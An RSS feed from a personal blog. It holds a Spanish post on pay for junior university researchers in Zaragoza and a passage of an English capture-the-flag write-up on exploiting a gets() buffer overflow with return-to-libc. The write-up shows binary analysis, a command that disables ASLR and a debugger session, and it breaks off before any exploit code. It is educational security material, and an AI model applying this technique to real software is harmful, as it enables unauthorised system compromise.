<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts | Daniel Uroz</title>
    <link>https://duroz.github.io/post/</link>
      <atom:link href="https://duroz.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    <description>Posts</description>
    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Fri, 25 Jun 2021 00:00:00 +0000</lastBuildDate>
    <image>
      <url>https://duroz.github.io/media/icon_hu235ca53f37dee462d16f210e413d062e_29183_512x512_fill_lanczos_center_3.png</url>
      <title>Posts</title>
      <link>https://duroz.github.io/post/</link>
    </image>
    
    <item>
      <title>¿Cuál es el sueldo de un investigador en la Universidad?</title>
      <link>https://duroz.github.io/post/sueldo-investigador/</link>
      <pubDate>Fri, 25 Jun 2021 00:00:00 +0000</pubDate>
      <guid>https://duroz.github.io/post/sueldo-investigador/</guid>
      <description>&lt;p&gt;&lt;strong&gt;ACTUALIZACIÓN 20/03/2023&lt;/strong&gt;: la Universidad de Zaragoza ha decidido ser menos transparente y ahora las tablas salariales son &amp;ldquo;&amp;ldquo;&amp;ldquo;públicas&amp;rdquo;&amp;rdquo;&amp;rdquo;, solamente puedes acceder a ellas si tienes una cuenta de correo electrónico de la universidad.&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Esta vez vamos a hablar de una de las peores facetas de trabajar como investigador para la universidad pública española: &lt;del&gt;temporalidad, precariedad, incertidumbre, inestabilidad, burocracia, falta de financiación, endogamia, amiguismo, envejecimiento de la plantilla, desactualización, falta de transparencia&lt;/del&gt; &lt;strong&gt;sueldo&lt;/strong&gt;. Vamos a ir calculando qué &lt;strong&gt;sueldo neto mensual&lt;/strong&gt; obtienen las distintas figuras del investigador (lo que tú realmente ves ingresado en el banco), desde recién graduados hasta doctorandos. Salvo que se indique lo contrario, todos los sueldos que veamos corresponden a &lt;strong&gt;trabajadores de la Universidad de Zaragoza con una dedicación a Tiempo Completo (TC)&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Aunque todos los sueldos tratados son públicos, a veces no nos hacemos a la idea de cuánto dinero vamos a obtener a final de mes para saber si esta vida profesional nos interesa y, sobre todo, qué sueldo vamos a cobrar a medida que cumplamos años. Esta recopilación va dirigida principalmente a aquellos estudiantes que tienen su primer contacto laboral a través de la Universidad, así que solamente veremos los puestos más bajos (los que no requieren un doctorado).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;: todos los sueldos netos son transcipciones de mis nóminas o las de conocidos. Las cifras aquí presentadas pueden variar ligeramente en función de la situación de cada uno.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Figura&lt;/th&gt;
&lt;th&gt;Requisitos&lt;/th&gt;
&lt;th&gt;Rango edad&lt;/th&gt;
&lt;th&gt;Sueldo neto mensual&lt;/th&gt;
&lt;th&gt;Nº pagas&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Investigador Novel (N4)&lt;/td&gt;
&lt;td&gt;Grado&lt;/td&gt;
&lt;td&gt;22-24 años&lt;/td&gt;
&lt;td&gt;883 €&lt;/td&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Investigador Iniciado (N3)&lt;/td&gt;
&lt;td&gt;Grado, Máster&lt;/td&gt;
&lt;td&gt;23-26 años&lt;/td&gt;
&lt;td&gt;986 €&lt;/td&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Investigador Iniciado (N3.1)&lt;/td&gt;
&lt;td&gt;Grado, Máster, 2 años investigando&lt;/td&gt;
&lt;td&gt;25 años hasta doctorarse&lt;/td&gt;
&lt;td&gt;1269 €&lt;/td&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Beca predoctoral DGA&lt;/td&gt;
&lt;td&gt;Grado, Máster, ganar una convocatoria pública&lt;/td&gt;
&lt;td&gt;23-27 años&lt;/td&gt;
&lt;td&gt;1191 €&lt;/td&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;investigador-novel-n4&#34;&gt;Investigador Novel (N4)&lt;/h2&gt;
&lt;p&gt;A todo el mundo nos hace ilusión nuestro primer trabajo. Y el Investigador Novel (N4), en adelante simplemente N4, es el primer tipo de contrato que ofrecen a un recién graduado en la Universidad. Todos los sueldos de investigador son &lt;a href=&#34;https://www.unizar.es/gobierno/gerente/vg_investigacion/ConcursosdePe_MMtmp4ea75d06/ConcursosdePersonalInvestigador.htm&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;públicos&lt;/a&gt;, y se asignan según los estudios que tengas. En el caso de un N4, &lt;a href=&#34;https://www.unizar.es/gobierno/gerente/vg_investigacion/ConcursosdePe_MMtmp4ea75d06/doc/N4.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;si consultamos su sueldo en la página de la Vigerencia de Investigación&lt;/a&gt;, nos encontramos con una tabla en la que aparece la bonita cifra de 19 676,37 €.&lt;/p&gt;
&lt;p&gt;















&lt;figure  &gt;
  &lt;div class=&#34;d-flex justify-content-center&#34;&gt;
    &lt;div class=&#34;w-100&#34; &gt;&lt;img alt=&#34;Coste contratación&#34; srcset=&#34;
               /post/sueldo-investigador/costes-contratacion-n4_hu89bbfca33333258d7b8ea55cf08df651_111719_b16d20e34ea1f8f6017670a06e3ed284.webp 400w,
               /post/sueldo-investigador/costes-contratacion-n4_hu89bbfca33333258d7b8ea55cf08df651_111719_4bf5416c49e4accfb9748fd7eb346c8d.webp 760w,
               /post/sueldo-investigador/costes-contratacion-n4_hu89bbfca33333258d7b8ea55cf08df651_111719_1200x1200_fit_q75_h2_lanczos_3.webp 1200w&#34;
               src=&#34;https://duroz.github.io/post/sueldo-investigador/costes-contratacion-n4_hu89bbfca33333258d7b8ea55cf08df651_111719_b16d20e34ea1f8f6017670a06e3ed284.webp&#34;
               width=&#34;760&#34;
               height=&#34;612&#34;
               loading=&#34;lazy&#34; data-zoomable /&gt;&lt;/div&gt;
  &lt;/div&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;Joder, 19 676,37 € de sueldo bruto anual como primer trabajo de un recién graduado en España es (desgraciadamente) un buen sueldo. ¿De qué se queja este chico? Pues de que esta cifra es lo que le cuesta a tu jefe contratarte. Si te fijas dos filas más arriba verás exactamente qué te están ofreciendo cuando te quieren contratar como un N4, &lt;strong&gt;14 343,69 € brutos anuales&lt;/strong&gt;. Para poner esta cifra en perspectiva, &lt;a href=&#34;https://www.boe.es/eli/es/rd/2020/02/04/231&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;el Salario Mínimo Interprofesional (SMI) en España para este 2021 es de 13 300 € brutos anuales&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Este tipo de contrato es en &lt;strong&gt;14 pagas&lt;/strong&gt;, por lo que a final de mes recibirás un &lt;strong&gt;sueldo neto de 883 €&lt;/strong&gt;. Calcular los rangos de edad es muy dependiente de la situación de cada uno, pero partiendo de la situación idílica de que pudiste empezar el Grado a los 18 años y que te graduaste en los años que te tocaban, trabajarías en este puesto &lt;strong&gt;desde los 22 años hasta que obtengas un máster&lt;/strong&gt;. Dependiendo de los créditos del máster que elijas, puedes ser N4 desde los 22 años hasta los 23 años (60 ECTS de Máster), 23,5 años (90 ECTS) o 24 años (120 ECTS).&lt;/p&gt;
&lt;p&gt;Una situación típica es que te ofrezcan un puesto de &lt;strong&gt;N4 con dedicación a Tiempo Parcial (TP)&lt;/strong&gt; mientras te estás sacando el Máster. En este caso, seguimos hablando de un sueldo en &lt;strong&gt;14 pagas&lt;/strong&gt;, pero esta vez se establece el &lt;strong&gt;sueldo neto mensual en 454 €&lt;/strong&gt;.&lt;/p&gt;
&lt;h2 id=&#34;investigador-iniciado-n3&#34;&gt;Investigador Iniciado (N3)&lt;/h2&gt;
&lt;p&gt;El puesto de Investigador Iniciado (N3) se otorga a aquel &lt;strong&gt;trabajador que tiene un máster&lt;/strong&gt;, independientemente de si ha investigado con anterioridad o no. Cosas de la vida. &lt;a href=&#34;https://www.unizar.es/gobierno/gerente/vg_investigacion/ConcursosdePe_MMtmp4ea75d06/doc/N3.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Si buscamos su sueldo público&lt;/a&gt;, veremos que el &lt;strong&gt;sueldo bruto anual es de 15 647,53 €&lt;/strong&gt; en &lt;strong&gt;14 pagas&lt;/strong&gt;, por lo que recibirás un &lt;strong&gt;sueldo neto mensual de 986 €&lt;/strong&gt;. ¡Casi casi mileurista!&lt;/p&gt;
&lt;p&gt;Suponiendo que has optado por la vía más corta para obtener un máster, trabajarás de N3 &lt;strong&gt;desde los 23 años hasta los 25 años&lt;/strong&gt;, momento en el que habrás conseguido los dos años de experiencia que piden para el siguiente rango, Investigador Iniciado (N3.1).&lt;/p&gt;
&lt;h2 id=&#34;investigador-iniciado-n31&#34;&gt;Investigador Iniciado (N3.1)&lt;/h2&gt;
&lt;p&gt;Para que te contraten como Investigador Iniciado (N3.1), &lt;a href=&#34;https://www.unizar.es/gobierno/gerente/vg_investigacion/ConcursosdePe_MMtmp4ea75d06/doc/N3-1.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;aparte de las ganas de tu jefe para que le consumas 27 000 € de un proyecto&lt;/a&gt;, &lt;strong&gt;necesitas un máster y 2 años de experiencia investigadora&lt;/strong&gt;. En este caso, el &lt;strong&gt;sueldo bruto anual es de 20 610,87 €&lt;/strong&gt;, el cual empieza a acercarse a una cifra aceptable, y solamente habrás necesitado sacarte un grado, un máster, y haber trabajado 2 años de investigador. Con este puesto, tu &lt;strong&gt;sueldo neto mensual es de 1269 €&lt;/strong&gt; en &lt;strong&gt;14 pagas&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Suponiendo que te has sacado tanto el grado como el máster (de 60 ECTS) seguidos y a la primera, estarás en este puesto &lt;strong&gt;desde los 25 años hasta que te doctores&lt;/strong&gt;. Aunque no suele ser lo habitual, suponiendo que has trabajado siempre a TC y te ha dado tiempo a sacarte el máster a la vez, realmente podrías optar a este puesto desde los 24 años. Sin embargo, para optar al siguiente puesto de Doctor (N2) necesitas, obviamente, un doctorado. Nuestra edad y el tiempo que estaremos en este puesto variarán dependiendo de lo que hayamos optado anteriormente:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Si no quieres estudiar el doctorado y quieres seguir trabajando en la universidad, tu puesto siempre será el de un N3.1.&lt;/li&gt;
&lt;li&gt;Suponiendo que empiezas el doctorado justo al acabar el máster, y da la casualidad de que tu tesis trata sobre el mismo tema que el proyecto que te financia (y no realizar así el doctorado totalmente gratis, como pasa a veces), cobrarás los dos primeros años de doctorado como N3 (de 23 a 25 años) y los dos siguientes como N3.1 (de 25 a 27 años).&lt;/li&gt;
&lt;li&gt;Si consigues obtener una beca FPU/FPI/DGA para estudiar el doctorado justo al acabar el máster, lo más probable es que nunca te contraten como N3.1, así que no tendrás que preocuparte de qué hacer con tanto dinero a final de mes.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;beca-predoctoral-dga&#34;&gt;Beca predoctoral DGA&lt;/h2&gt;
&lt;p&gt;Esta beca dota de estabilidad a un estudiante de doctorado, quien durante 4 años no tendrá que preocuparse de saltar de proyecto en proyecto para obtener financiación para poder realizar su tesis doctoral. Esta beca es de ámbito autonómico, en este caso concreto convocada por el Gobierno de Aragón, y permite financiar la tesis doctoral de una persona que vaya a realizar su tesis en una institución localizada en Aragón, ya sea en la Universidad de Zaragoza, el Instituto de Investigación Sanitaria de Aragón (IIS Aragón) o la delegación del Consejo Superior de Investigaciones Científicas (CSIC) en Aragón. Su nombre oficial es &lt;a href=&#34;https://www.aragon.es/tramitador/-/tramite/subvenciones-contratacion-personal-investigador-pre-doctoral-formacion&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Subvención para la contratación de personal investigador predoctoral en formación&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Aunque sí que es verdad que da una mayor estabilidad, no existe un salto en cuanto a sueldo. De hecho, supone una pérdida de dinero si antes trabajábamos como N3.1. En el caso de la &lt;a href=&#34;http://www.boa.aragon.es/cgi-bin/EBOA/BRSCGI?CMD=VEROBJ&amp;amp;MLKOB=1080483043030&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;convocatoria de 2019/2023&lt;/a&gt;, se establece que:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;La retribución salarial mínima que deberán recibir cada uno de los investigadores predoctorales en formación durante este período, que se indicará en cada contrato, será de &lt;strong&gt;16.824 euros brutos anuales&lt;/strong&gt; (correspondientes a 12 mensualidades de 1.402 euros).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Aunque la convocatoria diga &amp;ldquo;retribución salarial mínima&amp;rdquo;, ese sueldo es el que vas a obtener. En bruto. Y en &lt;strong&gt;12 pagas&lt;/strong&gt;. Una vez quitemos los distintos impuestos, nosotros veremos un &lt;strong&gt;sueldo neto mensual de 1191 € sin pagas extras&lt;/strong&gt;. En el mejor de los casos podrías optar a esta beca &lt;strong&gt;desde los 23 años&lt;/strong&gt;, pero normalmente se tarda algo más en obtenerla, y te financiará durante 4 años &lt;strong&gt;hasta los 27 años&lt;/strong&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>247/CTF - pwn - Non Executable Stack</title>
      <link>https://duroz.github.io/post/247ctf-pwn-non-executable-stack/</link>
      <pubDate>Mon, 08 Jun 2020 00:00:00 +0000</pubDate>
      <guid>https://duroz.github.io/post/247ctf-pwn-non-executable-stack/</guid>
      <description>&lt;p&gt;In this post, we&amp;rsquo;ll cover how to exploit a stack-based buffer overflow, this time with the stack marked as non executable. We firstly detail how to manually exploit the binary locally and, after that, in the remote server. At the end, we&amp;rsquo;ll use the Python library &lt;a href=&#34;https://github.com/Gallopsled/pwntools&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;pwntools&lt;/a&gt; to speed up exploit development.&lt;/p&gt;
&lt;h2 id=&#34;challenge&#34;&gt;Challenge&lt;/h2&gt;
&lt;p&gt;This time, &lt;a href=&#34;https://247ctf.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;247/CTF&lt;/a&gt; give us a binary called &lt;code&gt;non_executable_stack&lt;/code&gt; with the following description:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There are no hidden flag functions in this binary. Can you make your own without executing from the stack?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And here is an example of execution flow:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./non_executable_stack 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter the secret password:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Incorrect secret password!
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s a ELF 32-bit as previous pwn challenges, but this time with &lt;a href=&#34;https://en.wikipedia.org/wiki/NX_bit&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;NX bit&lt;/a&gt; enable to make stack segment (and any other) writable but not executable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ checksec non_executable_stack
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/urzu/247ctf/pwn/non_executable_stack&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Arch:     i386-32-little
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    RELRO:    Partial RELRO
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Stack:    No canary found
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NX:       NX enabled
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    PIE:      No PIE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x8048000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This &lt;code&gt;checksec&lt;/code&gt; version is the one coming with pwntools (you can install it with &lt;code&gt;python3 -m pip install pwntools&lt;/code&gt;), there is also a &lt;a href=&#34;https://github.com/slimm609/checksec.sh&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Bash script&lt;/a&gt; with the same functionality.&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;If we analyze the binary, we can quickly spot the use of &lt;code&gt;gets&lt;/code&gt; function to retrieve the password, so we can overflow the buffer due to no outbounds checking of the function:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;$ r2 non_executable_stack 
-- Virtual machines are great, but you lose the ability to kick the hardware.
[0x080483c0]&amp;gt; aa
[x] Analyze all flags starting with sym. and entry0 (aa)                   
[0x080483c0]&amp;gt; s sym.chall 
[0x080484d6]&amp;gt; pdf
            ; CALL XREF from main @ 0x804857f
┌ 103: sym.chall ();
│           ; var int32_t var_28h @ ebp-0x28
│           ; var int32_t var_4h @ ebp-0x4
│           0x080484d6      55             push ebp
│           0x080484d7      89e5           mov ebp, esp
│           0x080484d9      53             push ebx
│           0x080484da      83ec24         sub esp, 0x24
[... redacted ...]
│           0x080484eb      8d45d8         lea eax, [var_28h]
│           0x080484ee      50             push eax
│           0x080484ef      e88cfeffff     call sym.imp.gets           ; char *gets(char *s) &amp;lt;--- buffer overflow
[... redacted ...]
│      │    0x08048528      8d833de6ffff   lea eax, [ebx - 0x19c3]
│      │    0x0804852e      50             push eax
│      │    0x0804852f      e85cfeffff     call sym.imp.puts           ; int puts(const char *s)
│      │    0x08048534      83c410         add esp, 0x10
│      │    ; CODE XREF from sym.chall @ 0x8048523
│      └──&amp;gt; 0x08048537      90             nop
│           0x08048538      8b5dfc         mov ebx, dword [var_4h]
│           0x0804853b      c9             leave
└           0x0804853c      c3             ret
[0x080484d6]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This problem is that, whereas in previous challenges we could execute our payload directly into the stack, this time NX bit is preventing us to do so. Still, we can overwrite the return based stored in the stack to control the program flow, so why don&amp;rsquo;t use the code already residing in executable segments to our purpose? This is the main idea behind &lt;a href=&#34;https://en.wikipedia.org/wiki/Return-to-libc_attack&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Return-to-libc attack&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/Return-oriented_programming&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Return-oriented programming&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;return-to-libc&#34;&gt;Return-to-libc&lt;/h3&gt;
&lt;p&gt;This attack relies of using code marked as executable contained in &lt;code&gt;libc&lt;/code&gt; shared library. &lt;code&gt;libc&lt;/code&gt; provides a runtime environment to C programs, so it usually loaded into the memory of most processes. In this binary, we can see that it will effectively be loaded thanks to:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ldd non_executable_stack 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;linux-gate.so.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xf7fd2000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;libc.so.6 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; /lib32/libc.so.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xf7dd4000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/lib/ld-linux.so.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xf7fd4000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;libc&lt;/code&gt; provides a lot of functions like &lt;code&gt;printf&lt;/code&gt;, &lt;code&gt;scanf&lt;/code&gt;, &lt;code&gt;fopen&lt;/code&gt; and so on. Thus, if we can execute &lt;code&gt;system&lt;/code&gt; function (which execute a shell command) with &lt;code&gt;/bin/sh&lt;/code&gt; parameter, we&amp;rsquo;ll be able to prompt an interactive shell.&lt;/p&gt;
&lt;h2 id=&#34;local-exploit&#34;&gt;Local exploit&lt;/h2&gt;
&lt;p&gt;We&amp;rsquo;re going to develop a local version of the exploit and, in order to make it easier, we&amp;rsquo;re going to deactivate &lt;a href=&#34;https://en.wikipedia.org/wiki/Address_space_layout_randomization&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ASLR protection&lt;/a&gt; of our system:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sudo tee /proc/sys/kernel/randomize_va_space
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Firstly, we can obtain the necessary padding to overwrite the return address placing a breakpoint just before the &lt;code&gt;ret&lt;/code&gt; instruction (&lt;code&gt;0x0804853c&lt;/code&gt; in the code above) and seeing where is our input:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ r2 -d non_executable_stack
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Process with PID &lt;span class=&#34;m&#34;&gt;2381&lt;/span&gt; started...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; attach &lt;span class=&#34;m&#34;&gt;2381&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2381&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bin.baddr 0x08048000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Using 0x8048000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;asm.bits &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;glibc.fc_offset &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0x00148
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -- Most likely your core dump fell into a blackhole, can&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t see it.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xf7fd50b0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; aa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Analyze all flags starting with sym. and entry0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;aa&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xf7fd50b0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; db 0x0804853c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xf7fd50b0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; dc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter the secret password:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Incorrect secret password!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hit breakpoint at: 804853c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x0804853c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; px -0x2c @ esp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- offset -   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;  A B  C D  E F  0123456789ABCDEF
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xffffd1d0  6b6b 00ff &lt;span class=&#34;m&#34;&gt;9096&lt;/span&gt; fef7 90f8 faf7 00a0 &lt;span class=&#34;m&#34;&gt;0408&lt;/span&gt;  kk..............
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xffffd1e0  00e0 faf7 00e0 faf7 08d2 ffff 7c85 &lt;span class=&#34;m&#34;&gt;0408&lt;/span&gt;  ............&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;...
